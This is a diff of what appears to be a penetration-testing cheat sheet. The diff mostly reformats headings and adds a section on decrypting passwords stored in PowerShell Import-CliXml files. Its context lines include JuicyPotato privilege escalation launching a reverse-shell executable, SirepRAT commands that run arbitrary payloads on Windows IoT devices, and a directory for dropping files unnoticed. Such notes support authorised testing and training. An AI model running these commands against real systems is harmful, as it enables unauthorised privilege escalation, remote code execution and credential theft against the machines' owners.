@@ -674,10 +674,10 @@ CLSID is based on operating system, see above links for more information about l
 .\juicypotato.exe -l 1337 -p c:\test\revshell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
-### lolbins
+### [lolbins]
 https://lolbas-project.github.io/lolbas/Binaries/Certreq/
 
-### Hacking IOT Devices
+### [Hacking IOT Devices]
 https://github.com/SafeBreach-Labs/SirepRAT
 
 ```
@@ -686,7 +686,13 @@ python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Window
 python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c <PAYLOAD>" --v
 ```
 
-### Common safe drop paths
+### [Common safe drop paths]
 ```
 C:\\Windows\\System32\\spool\\drivers\\color\\
+```
+
+### [decrypt password within xml file using Import-CliXml]
+```
+$credential = Import-CliXml -Path <xml dat with encrypted password>
+$credential.GetNetworkCredential().Password
 ```
